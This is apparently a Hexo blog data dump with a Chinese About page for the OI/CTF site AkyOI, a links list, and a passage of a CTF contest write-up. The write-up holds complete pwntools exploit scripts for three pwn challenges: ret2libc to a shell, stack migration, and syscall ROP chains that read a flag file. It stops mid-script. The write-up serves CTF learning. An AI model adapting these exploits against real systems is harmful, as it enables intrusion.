2022/7/1\n移动端适配没有解决。建议使用分辨率1080p的屏幕进行浏览。\n鸽了，离今年的CSP仅剩77天了，等高中毕业再继续开发这些功能吧。毕竟我看ybt的网站适配也不咋地。再说了，不会真有人搞OI用手机吧。除了主页，其他页面勉强能用。\nOnlineJudge目前只是个猜想，用JavaScript去模拟阅读理解源代码，从而模拟编译运行的效果，但是似乎Time和Memory的limits似乎无法进行Judge。\nOfflineJudge目前开发了一半，等我高中毕业再开发吧。Offline的Judge最核心还是实现一个类似于对拍的效果，只不过是直接将运行结果与.ans文件进行对比。实现也很简单，考场上都能写出来。目前最大的瓶颈就是没有服务器。。。。。。Submit也是个大问题。\n短期来看，实现Judge基本是不大可能的。\n就算实现了，也仅仅只是offline的Judge，Ranking是很麻烦的。\n如果有大佬有好想法的话，不妨分享一下。我先鸽了。\n\n\n\n\n\n\n你不觉得显示的东西少了亿点点吗？？？身为一名OIer，不会真有人没读过源代码吧，不会吧，不会吧~\n\n\n\n更新记录：\n\n>> 2022/7/1 创建了这个页面，写了一堆东西\n>> 2022/8/1 进行了亿些修改，添加了一些好玩的东西，开始玩梗（114514 1919810）\n>> 2022/12/14 进行了UI的修改，至少看起来不那么扎眼了\n>> 2023/8/24 UI添加了一些动画；开设CTF板块，更新CTF学习内容；具体内容目录将以tree的形式呈现；添加了Sidebar，同时优化了代码，更方便维护；修改了一些BUG（绝对是大更新）\n\n\n\nAkyOI ~ 2023 | By Zchared","date":"2023-11-04T09:55:26.445Z","updated":"2023-11-04T09:55:26.445Z","path":"about/index.html","title":"","comments":1,"layout":"page","_id":"clojw0f8o0000g4aiegttfsna","content":"<p><div class=\"links\"><div class=\"item\" title=\"AkyOI\" style=\"--block-color:#d0ccf7;\"><span class=\"exturl image\" data-url=\"aHR0cDovLzM5LjEwNy41NS43NA==\" data-background-image=\"/images/avatar.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cDovLzM5LjEwNy41NS43NA==\">AkyOI</span>\n          <p class=\"desc\">Latest-Version</p>\n          </div></div></div><br />\n<span class=\"lable primary\">Updated 2023/11/4</span></p>\n<h1 id=\"关于akyoi\"><a class=\"anchor\" href=\"#关于akyoi\">#</a> 关于 AkyOI</h1>\n<p>AkyO 之前是在 GitHubPage，现在正式开始开发基于云服务器和 hexo 的 Page，此外，还打算继续搭建一些 OJ 等，实现高中时期画的大饼。<br />\n<span class=\"spoiler\" title=\"你知道得太多了\">我也不知道该说些什么</span></p>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_0\" disabled=\"true\" /><label for=\"cbx_0\"> 搭建 OJ</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_1\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_1\"> 让 Blog 更加美观、!<span class=\"spoiler bulr\" title=\"你知道得太多了\"> 更加二次元</span><br />\n {.primary}</label></li>\n</ul>\n<div class=\"note info\">\n<p>oi!!! 以下是 Copy 的 Legacy 网页内容。</p>\n</div>\n<p><span class=\"label danger\">💔某些功能不再使用，请前往原网站查看。</span><br />\n<div class=\"links\"><div class=\"item\" title=\"Zchared\" style=\"--block-color:#d0ccf7;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9ha3lvaS5ha3l1dS5zcGFjZS9BYm91dC8=\" data-background-image=\"/images/avatar.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9ha3lvaS5ha3l1dS5zcGFjZS9BYm91dC8=\">About-AkyOI（Legacy）</span>\n          <p class=\"desc\">Stable-Version (Legacy)</p>\n          </div></div></div><br />\n# 关于 AkyOI<br />\nAkyOI, 由 Zchared 创始并且开发。目前此人很神秘，应该没人知道他叫啥。（车万人，不是原神厨。）<br />\nApril 17, 2022，Zchared 在 Github 上创建了此代码库，并且着手开发此 Github Page。2022/7/1，此 Github Page 的开发接近尾声，但是 OnlineJudge 和 Offline Judge 还没有落实。<br />\n其实此 GitHubPage 原来是想命名为 FzOI 的，但是 FengXian 中学的所作所为让 Zchared 放弃了这个想法，他认为他自己辛苦敲出来的 Page 为啥要给这个对 OI 有偏见的学校。因此改名为 ZcOI<br />\n 之后，身为一名车万人，他想到了稗田阿求（Hieda no Akyuu）, 脑子来了灵感，就把这个 Page 命名为 AkyOI，寓意就是：<br />\n像稗田阿求一样，世世代代记录着 OI 的事情。<br />\n（最重要的一点，就是 OIer 和稗田阿求一样都是人类，没有博丽灵梦和幽幽子等人的能力，而且都是寿命论的受害者，因此希望 OIer 们都能像稗田阿求一样珍惜仅存的生命）<br />\n顺便提一下，此 GitHubpage 的号，只是个小号。</p>\n<p>#关于 Zchared<br />\nZchared, 不知道他叫啥。只知道...<br />\n（不信你去看他 QQ：3433778745，主页上全是稗田阿求（现在还有一只绯想天桃子） /<em> 除了他那几张用来显摆的 OI 证书</em> /<br />\n（他 2022 年下半年就要退役 OI 了，希望他可以完成他的愿望：NOIP 一等奖） Update 2022/12/13 : 事实上高三他拿了国二，离国一差 8 分。。。当时 T4 有八分很容易拿，他很可惜没得到。（他其实都没考虑做 T4</p>\n<p>Q: 他为什么搞 OI 啊？？？<br />\nA：初二的时候他开始对计算机科学产生了兴趣。无数次的偶然中，他在初二自学了 C/C++，而没有学其他的语言，但是仍然作为一个兴趣。他当时并不知道有个东西叫做 OI。<br />\n之后，他再高一开学前接触到了数学，物理，化学，生物<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">等</span><br></pre></td></tr></table></figure><br />\n 奥林匹克竞赛中的信息学竞赛<br />\n（你不需要知道为啥这里为啥突出 “等”）<br />\nZchared 本人的话：“... 来来来！全体目光向我看齐！我郑重宣布个事：我 就 是 歌 姬...（呸！）！ 我是个正常人！” ”</p>\n<p>Q:OI 好学吗<br />\n A: 好学，就是不会用。基础知识是正经大学本科的基础，算法跟数据结构就是小于大学竞赛的难度，大于大学本科的难度。</p>\n<p>......</p>\n<p>#关于稗田阿求</p>\n<p>不多说，上链接<br />\n稗田阿求 - THBWiki</p>\n<p>#Others<br />\n 重申一下，此 Page 建设的目的，就是帮助 OIer 们能够更加轻松的去学习 OI，少走弯路，一年级上国一，二年级 NOI 金牌，三年级 AK IOI，四年级 AK ICPC，走上人生巅峰！<br />\n本 Page 与任何中学，任何机构没有任何关系，纯粹为爱发电。不喜勿喷。<br />\n背景 - pixiv:71925485</p>\n<p>#本 Page 目前的遗憾（Legacy）<br />\nUpdate 2022/7/1<br />\n 移动端适配没有解决。建议使用分辨率 1080p 的屏幕进行浏览。<br />\n鸽了，离今年的 CSP 仅剩 77 天了，等高中毕业再继续开发这些功能吧。毕竟我看 ybt 的网站适配也不咋地。再说了，不会真有人搞 OI 用手机吧。除了主页，其他页面勉强能用。<br />\nOnlineJudge 目前只是个猜想，用 JavaScript 去模拟阅读理解源代码，从而模拟编译运行的效果，但是似乎 Time 和 Memory 的 limits 似乎无法进行 Judge。<br />\nOfflineJudge 目前开发了一半，等我高中毕业再开发吧。Offline 的 Judge 最核心还是实现一个类似于对拍的效果，只不过是直接将运行结果与.ans 文件进行对比。实现也很简单，考场上都能写出来。目前最大的瓶颈就是没有服务器。。。。。。Submit 也是个大问题。<br />\n短期来看，实现 Judge 基本是不大可能的。<br />\n就算实现了，也仅仅只是 offline 的 Judge，Ranking 是很麻烦的。<br />\n如果有大佬有好想法的话，不妨分享一下。我先鸽了。</p>\n<p>你不觉得显示的东西少了亿点点吗？？？身为一名 OIer，不会真有人没读过源代码吧，不会吧，不会吧～</p>\n<p>更新记录：</p>\n<blockquote>\n<blockquote>\n<p>2022/7/1 创建了这个页面，写了一堆东西<br />\n 2022/8/1 进行了亿些修改，添加了一些好玩的东西，开始玩梗（114514 1919810）<br />\n2022/12/14 进行了 UI 的修改，至少看起来不那么扎眼了<br />\n 2023/8/24 UI 添加了一些动画；开设 CTF 板块，更新 CTF 学习内容；具体内容目录将以 tree 的形式呈现；添加了 Sidebar，同时优化了代码，更方便维护；修改了一些 BUG（绝对是大更新）</p>\n</blockquote>\n</blockquote>\n<p>AkyOI ~ 2023 | By Zchared</p>\n","excerpt":"","more":"<p><div class=\"links\"><div class=\"item\" title=\"AkyOI\" style=\"--block-color:#d0ccf7;\"><span class=\"exturl image\" data-url=\"aHR0cDovLzM5LjEwNy41NS43NA==\" data-background-image=\"/images/avatar.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cDovLzM5LjEwNy41NS43NA==\">AkyOI</span>\n          <p class=\"desc\">Latest-Version</p>\n          </div></div></div><br />\n<span class=\"lable primary\">Updated 2023/11/4</span></p>\n<h1 id=\"关于akyoi\"><a class=\"anchor\" href=\"#关于akyoi\">#</a> 关于 AkyOI</h1>\n<p>AkyO 之前是在 GitHubPage，现在正式开始开发基于云服务器和 hexo 的 Page，此外，还打算继续搭建一些 OJ 等，实现高中时期画的大饼。<br />\n<span class=\"spoiler\" title=\"你知道得太多了\">我也不知道该说些什么</span></p>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_0\" disabled=\"true\" /><label for=\"cbx_0\"> 搭建 OJ</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_1\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_1\"> 让 Blog 更加美观、!<span class=\"spoiler bulr\" title=\"你知道得太多了\"> 更加二次元</span><br />\n {.primary}</label></li>\n</ul>\n<div class=\"note info\">\n<p>oi!!! 以下是 Copy 的 Legacy 网页内容。</p>\n</div>\n<p><span class=\"label danger\">💔某些功能不再使用，请前往原网站查看。</span><br />\n<div class=\"links\"><div class=\"item\" title=\"Zchared\" style=\"--block-color:#d0ccf7;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9ha3lvaS5ha3l1dS5zcGFjZS9BYm91dC8=\" data-background-image=\"/images/avatar.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9ha3lvaS5ha3l1dS5zcGFjZS9BYm91dC8=\">About-AkyOI（Legacy）</span>\n          <p class=\"desc\">Stable-Version (Legacy)</p>\n          </div></div></div><br />\n# 关于 AkyOI<br />\nAkyOI, 由 Zchared 创始并且开发。目前此人很神秘，应该没人知道他叫啥。（车万人，不是原神厨。）<br />\nApril 17, 2022，Zchared 在 Github 上创建了此代码库，并且着手开发此 Github Page。2022/7/1，此 Github Page 的开发接近尾声，但是 OnlineJudge 和 Offline Judge 还没有落实。<br />\n其实此 GitHubPage 原来是想命名为 FzOI 的，但是 FengXian 中学的所作所为让 Zchared 放弃了这个想法，他认为他自己辛苦敲出来的 Page 为啥要给这个对 OI 有偏见的学校。因此改名为 ZcOI<br />\n 之后，身为一名车万人，他想到了稗田阿求（Hieda no Akyuu）, 脑子来了灵感，就把这个 Page 命名为 AkyOI，寓意就是：<br />\n像稗田阿求一样，世世代代记录着 OI 的事情。<br />\n（最重要的一点，就是 OIer 和稗田阿求一样都是人类，没有博丽灵梦和幽幽子等人的能力，而且都是寿命论的受害者，因此希望 OIer 们都能像稗田阿求一样珍惜仅存的生命）<br />\n顺便提一下，此 GitHubpage 的号，只是个小号。</p>\n<p>#关于 Zchared<br />\nZchared, 不知道他叫啥。只知道...<br />\n（不信你去看他 QQ：3433778745，主页上全是稗田阿求（现在还有一只绯想天桃子） /<em> 除了他那几张用来显摆的 OI 证书</em> /<br />\n（他 2022 年下半年就要退役 OI 了，希望他可以完成他的愿望：NOIP 一等奖） Update 2022/12/13 : 事实上高三他拿了国二，离国一差 8 分。。。当时 T4 有八分很容易拿，他很可惜没得到。（他其实都没考虑做 T4</p>\n<p>Q: 他为什么搞 OI 啊？？？<br />\nA：初二的时候他开始对计算机科学产生了兴趣。无数次的偶然中，他在初二自学了 C/C++，而没有学其他的语言，但是仍然作为一个兴趣。他当时并不知道有个东西叫做 OI。<br />\n之后，他再高一开学前接触到了数学，物理，化学，生物<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">等</span><br></pre></td></tr></table></figure><br />\n 奥林匹克竞赛中的信息学竞赛<br />\n（你不需要知道为啥这里为啥突出 “等”）<br />\nZchared 本人的话：“... 来来来！全体目光向我看齐！我郑重宣布个事：我 就 是 歌 姬...（呸！）！ 我是个正常人！” ”</p>\n<p>Q:OI 好学吗<br />\n A: 好学，就是不会用。基础知识是正经大学本科的基础，算法跟数据结构就是小于大学竞赛的难度，大于大学本科的难度。</p>\n<p>......</p>\n<p>#关于稗田阿求</p>\n<p>不多说，上链接<br />\n稗田阿求 - THBWiki</p>\n<p>#Others<br />\n 重申一下，此 Page 建设的目的，就是帮助 OIer 们能够更加轻松的去学习 OI，少走弯路，一年级上国一，二年级 NOI 金牌，三年级 AK IOI，四年级 AK ICPC，走上人生巅峰！<br />\n本 Page 与任何中学，任何机构没有任何关系，纯粹为爱发电。不喜勿喷。<br />\n背景 - pixiv:71925485</p>\n<p>#本 Page 目前的遗憾（Legacy）<br />\nUpdate 2022/7/1<br />\n 移动端适配没有解决。建议使用分辨率 1080p 的屏幕进行浏览。<br />\n鸽了，离今年的 CSP 仅剩 77 天了，等高中毕业再继续开发这些功能吧。毕竟我看 ybt 的网站适配也不咋地。再说了，不会真有人搞 OI 用手机吧。除了主页，其他页面勉强能用。<br />\nOnlineJudge 目前只是个猜想，用 JavaScript 去模拟阅读理解源代码，从而模拟编译运行的效果，但是似乎 Time 和 Memory 的 limits 似乎无法进行 Judge。<br />\nOfflineJudge 目前开发了一半，等我高中毕业再开发吧。Offline 的 Judge 最核心还是实现一个类似于对拍的效果，只不过是直接将运行结果与.ans 文件进行对比。实现也很简单，考场上都能写出来。目前最大的瓶颈就是没有服务器。。。。。。Submit 也是个大问题。<br />\n短期来看，实现 Judge 基本是不大可能的。<br />\n就算实现了，也仅仅只是 offline 的 Judge，Ranking 是很麻烦的。<br />\n如果有大佬有好想法的话，不妨分享一下。我先鸽了。</p>\n<p>你不觉得显示的东西少了亿点点吗？？？身为一名 OIer，不会真有人没读过源代码吧，不会吧，不会吧～</p>\n<p>更新记录：</p>\n<blockquote>\n<blockquote>\n<p>2022/7/1 创建了这个页面，写了一堆东西<br />\n 2022/8/1 进行了亿些修改，添加了一些好玩的东西，开始玩梗（114514 1919810）<br />\n2022/12/14 进行了 UI 的修改，至少看起来不那么扎眼了<br />\n 2023/8/24 UI 添加了一些动画；开设 CTF 板块，更新 CTF 学习内容；具体内容目录将以 tree 的形式呈现；添加了 Sidebar，同时优化了代码，更方便维护；修改了一些 BUG（绝对是大更新）</p>\n</blockquote>\n</blockquote>\n<p>AkyOI ~ 2023 | By Zchared</p>\n"},{"_content":"{% links %}\n- site: AkyOI（Legacy） #站点名称\n  owner: Zchared #管理员名字\n  url: https://akyoi.akyuu.space #站点网址\n  desc: Stable-Version (Legacy) #简短描述\n  image: images/avatar.jpg #一张图片\n  color: \"#d0ccf7\" #颜色代码\n- site: NEUQCSA-Platform #站点名称\n  owner: NEUQCSA #管理员名字\n  url: http://platform.neuqcsa.cn:8000/users/4 #站点网址\n  desc: NEUQCSA-Platform #简短描述\n  image: images/neuqcsa.jpg #一张图片\n  color: \"#d9a866\" #颜色代码\n- site: BUUCTF #站点名称\n  owner: BUUCTF #管理员名字\n  url: https://buuoj.cn/users/118222 #站点网址\n  desc: BUUCTF #简短描述\n  image: images/buuctf.png #一张图片\n  color: \"#007bff\" #颜色代码\n- site: Luogu #站点名称\n  owner: Luogu #管理员名字\n  url: https://www.luogu.com.cn/user/381799 #站点网址\n  desc: Luogu #简短描述\n  image: images/luogu.png #一张图片\n  color: \"#5eb95e\" #颜色代码\n\n{% endlinks %}","source":"links/index.md","raw":"{% links %}\n- site: AkyOI（Legacy） #站点名称\n  owner: Zchared #管理员名字\n  url: https://akyoi.akyuu.space #站点网址\n  desc: Stable-Version (Legacy) #简短描述\n  image: images/avatar.jpg #一张图片\n  color: \"#d0ccf7\" #颜色代码\n- site: NEUQCSA-Platform #站点名称\n  owner: NEUQCSA #管理员名字\n  url: http://platform.neuqcsa.cn:8000/users/4 #站点网址\n  desc: NEUQCSA-Platform #简短描述\n  image: images/neuqcsa.jpg #一张图片\n  color: \"#d9a866\" #颜色代码\n- site: BUUCTF #站点名称\n  owner: BUUCTF #管理员名字\n  url: https://buuoj.cn/users/118222 #站点网址\n  desc: BUUCTF #简短描述\n  image: images/buuctf.png #一张图片\n  color: \"#007bff\" #颜色代码\n- site: Luogu #站点名称\n  owner: Luogu #管理员名字\n  url: https://www.luogu.com.cn/user/381799 #站点网址\n  desc: Luogu #简短描述\n  image: images/luogu.png #一张图片\n  color: \"#5eb95e\" #颜色代码\n\n{% endlinks %}","date":"2023-11-04T09:55:13.601Z","updated":"2023-11-04T09:55:13.601Z","path":"links/index.html","title":"","comments":1,"layout":"page","_id":"clojw0f8z0002g4ai0i5d5a8o","content":"<p><div class=\"links\"><div class=\"item\" title=\"Zchared\" style=\"--block-color:#d0ccf7;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9ha3lvaS5ha3l1dS5zcGFjZQ==\" data-background-image=\"/images/avatar.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9ha3lvaS5ha3l1dS5zcGFjZQ==\">AkyOI（Legacy）</span>\n          <p class=\"desc\">Stable-Version (Legacy)</p>\n          </div></div><div class=\"item\" title=\"NEUQCSA\" style=\"--block-color:#d9a866;\"><span class=\"exturl image\" data-url=\"aHR0cDovL3BsYXRmb3JtLm5ldXFjc2EuY246ODAwMC91c2Vycy80\" data-background-image=\"/images/neuqcsa.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cDovL3BsYXRmb3JtLm5ldXFjc2EuY246ODAwMC91c2Vycy80\">NEUQCSA-Platform</span>\n          <p class=\"desc\">NEUQCSA-Platform</p>\n          </div></div><div class=\"item\" title=\"BUUCTF\" style=\"--block-color:#007bff;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9idXVvai5jbi91c2Vycy8xMTgyMjI=\" data-background-image=\"/images/buuctf.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9idXVvai5jbi91c2Vycy8xMTgyMjI=\">BUUCTF</span>\n          <p class=\"desc\">BUUCTF</p>\n          </div></div><div class=\"item\" title=\"Luogu\" style=\"--block-color:#5eb95e;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cubHVvZ3UuY29tLmNuL3VzZXIvMzgxNzk5\" data-background-image=\"/images/luogu.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cubHVvZ3UuY29tLmNuL3VzZXIvMzgxNzk5\">Luogu</span>\n          <p class=\"desc\">Luogu</p>\n          </div></div></div></p>\n","excerpt":"","more":"<p><div class=\"links\"><div class=\"item\" title=\"Zchared\" style=\"--block-color:#d0ccf7;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9ha3lvaS5ha3l1dS5zcGFjZQ==\" data-background-image=\"/images/avatar.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9ha3lvaS5ha3l1dS5zcGFjZQ==\">AkyOI（Legacy）</span>\n          <p class=\"desc\">Stable-Version (Legacy)</p>\n          </div></div><div class=\"item\" title=\"NEUQCSA\" style=\"--block-color:#d9a866;\"><span class=\"exturl image\" data-url=\"aHR0cDovL3BsYXRmb3JtLm5ldXFjc2EuY246ODAwMC91c2Vycy80\" data-background-image=\"/images/neuqcsa.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cDovL3BsYXRmb3JtLm5ldXFjc2EuY246ODAwMC91c2Vycy80\">NEUQCSA-Platform</span>\n          <p class=\"desc\">NEUQCSA-Platform</p>\n          </div></div><div class=\"item\" title=\"BUUCTF\" style=\"--block-color:#007bff;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9idXVvai5jbi91c2Vycy8xMTgyMjI=\" data-background-image=\"/images/buuctf.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9idXVvai5jbi91c2Vycy8xMTgyMjI=\">BUUCTF</span>\n          <p class=\"desc\">BUUCTF</p>\n          </div></div><div class=\"item\" title=\"Luogu\" style=\"--block-color:#5eb95e;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cubHVvZ3UuY29tLmNuL3VzZXIvMzgxNzk5\" data-background-image=\"/images/luogu.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cubHVvZ3UuY29tLmNuL3VzZXIvMzgxNzk5\">Luogu</span>\n          <p class=\"desc\">Luogu</p>\n          </div></div></div></p>\n"}],"Post":[{"title":"NEUQCSA-2023-10月赛题解","_content":"markdown出问题的话直接看链接：https://zcoi.github.io/blogs/CTF/monthgame2310/\n# 解题情况\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/self1.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/self2.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/misc.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/web.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/pwn.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/cry.png)\n\n\n# 解题思路\n## Misc\n### level1-Login\n直接看html，发现base64加密的一串。直接解密就是flag\n\n\n\n## PWN\n### ret2libc\nQ:请嗯造libc\nA:我嗯造libc\n\n```python\nfrom pwn import*\ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\nelf=ELF('./pwn')\nlibc=ELF('./libc-2.31.so')\n# p=process('./pwn')\n# p=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\n# gdb.attach(p)\np=remote('8.130.110.158',2110)\n \nfunc_addr=elf.got['write']\nwrite_addr=elf.plt['write']\n \npop_rdi=0x4012a3\npop_rsi2=0x4012a1\nret=0x40101a\nvuln=0x4011db\n \npayload= b'a'*0x10+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadbeef)+p64(write_addr)+p64(vuln)\np.sendlineafter('voice :',payload)\np.recv()\nfunc_addr=u64(p.recv(6).ljust(8,b'\\x00'))\nbase=func_addr-libc.symbols['write']\nsystem_addr=base+libc.symbols['system']\nprintf_addr=base+libc.symbols['printf']\nsh=base+next(libc.search(b'/bin/sh'))\n \npause()\npayload=b'a'*0x10+p64(pop_rdi)+p64(sh)+p64(system_addr)+p64(vuln)\np.sendlineafter('voice :',payload)\n \np.interactive()\n \n# 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x00000000004012a0 : pop r14 ; pop r15 ; ret\n# 0x00000000004012a2 : pop r15 ; ret\n# 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x000000000040115d : pop rbp ; ret\n# 0x00000000004012a3 : pop rdi ; ret\n# 0x00000000004012a1 : pop rsi ; pop r15 ; ret\n# 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n```\n### Stack_Migration\n字面意思，栈可以到处跑\n正常审题程序不再罗列（checksec、IDA看字符串啥的）。\nIDA中发现有沙箱\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/1dis1.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/1seccomp.png)\n依旧是发现栈溢出。\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/1dis2.png)\n考虑到没法直接执行shellcode，因此只能构建ROP链。实现以下功能：\n```c\nchar*file='flag';\nopen(file,0,0);\nread(3,file,0x30);\nwrite(1,file,0x30);\n```\n这里把存储flag文件的名称和栈迁移之后的ROP链一起读入到bss那里。毕竟空间充足。\n```python\nfrom pwn import*\ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\nelf=ELF('./pwn')\nlibc=ELF('./libc-2.31.so')\np=remote('8.130.110.158',2109)\n# p=process('./pwn')\n# p=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\n# gdb.attach(p)\n \nbss_st=0x4040A0\nbss_tar=0x4040A0+0x200\nflag_name=0x4040a0+0x200-8\nflag_addr=bss_st+0x300-0x40\n \npop_rdi=0x401373\npop_rsi2=0x401371\nleave=0x4012e6\n \nfunc_addr=elf.got['read']\nwrite_addr=elf.plt['write']\nread_addr=elf.plt['read']\nvuln=0x401279\n \npayload1=b'a'*(0x200-0x8)+b'flag\\x00\\x00\\x00\\x00'+p64(bss_tar+0x100)+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(write_addr)+p64(0x4012a3)\np.sendlineafter('everywhere',payload1)\n \nmigr_pay=b'a'*0x8+p64(bss_tar)+p64(leave)\np.sendafter('voice :',migr_pay)\np.recv()\nfunc_addr=u64(p.recv(6).ljust(8,b'\\x00'))\nbase=func_addr-libc.symbols['read']\nprint(hex(base))\nsystem_addr=base+libc.symbols['system']\nprintf_addr=base+libc.symbols['printf']\nsh=base+next(libc.search(b'/bin/sh'))\nopen64_addr=base+libc.symbols['open64']\n \npop_rdx=0x142c92+base\npop_rsi=0x2601f+base\npause()\npayload2=p64(bss_st+0x100)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(open64_addr)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(read_addr)\npayload2+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(write_addr)+p64(vuln)\np.sendline(payload2)\n \nmigr_pay=b'a'*0x8+p64(bss_st)+p64(leave)\np.sendafter('voice :',migr_pay)\n \np.interactive()\n \n# 0x000000000040136c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040136e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x0000000000401370 : pop r14 ; pop r15 ; ret\n# 0x0000000000401372 : pop r15 ; ret\n# 0x000000000040136b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040136f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x00000000004011bd : pop rbp ; ret\n# 0x0000000000401373 : pop rdi ; ret\n# 0x0000000000401371 : pop rsi ; pop r15 ; ret\n# 0x000000000040136d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n# 0x000000000040121a : ret 0xfffe\n \n# in libc\n# 0x0000000000142c92 : pop rdx ; ret\n# 0x000000000002601f : pop rsi ; ret\n```\n### call me sys\nsyscall，但是只能用几个函数\n又是沙箱：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/2dis1.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/2seccomp.png)\n还是栈溢出漏洞：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/2dis2.png)\n由于没有关掉open,write,read函数，所以这题思路和上题一样。（题目说有三种方法，日后钻研）\n```python\nfrom pwn import*\n \ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\nelf=ELF('./pwn')\nlibc=ELF('./libc-2.31.so')\np=remote('8.130.110.158',2111)\n# p=process('./pwn')\n# p=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\n# gdb.attach(p)\nfunc_addr=elf.got['setvbuf']\nsyscall_ret=0x4012ec\npop_rdi=0x401363\npop_rsi2=0x401361\n \np.sendline(\"000\")\npayload=b'a'*0x78+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(0x401291)\npause()\np.sendline(payload)\np.recvuntil(b'./f1ag')\np.recv(2)\n# p.recvuntil(b'./f1ag\\x00\\x00\\x00')\nfunc_addr=u64(p.recv(6).ljust(8,b'\\x00'))\nbase=func_addr-libc.symbols['setvbuf']\nprint(hex(func_addr))\nprint(hex(base))\nsystem_addr=base+libc.symbols['system']\nprintf_addr=base+libc.symbols['printf']\nsh=base+next(libc.search(b'/bin/sh'))\nopen64_addr=base+libc.symbols['open64']\n \nflag_name=0x4040e0\npop_rdx=0x142c92+base\npop_rsi=0x2601f+base\npop_rax=0x36174+base\n \npayload=b'flag\\x00\\x00\\x00\\x00'\npause()\np.send(payload)\n \npayload=b'a'*0x78+p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rsi)+p64(0)+p64(syscall_ret)+p64(pop_rax)+p64(0)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(pop_rax)+p64(1)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(0x401270)\npause()\np.send(payload)\n \np.interactive(0)\n \n# 0x000000000040135c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 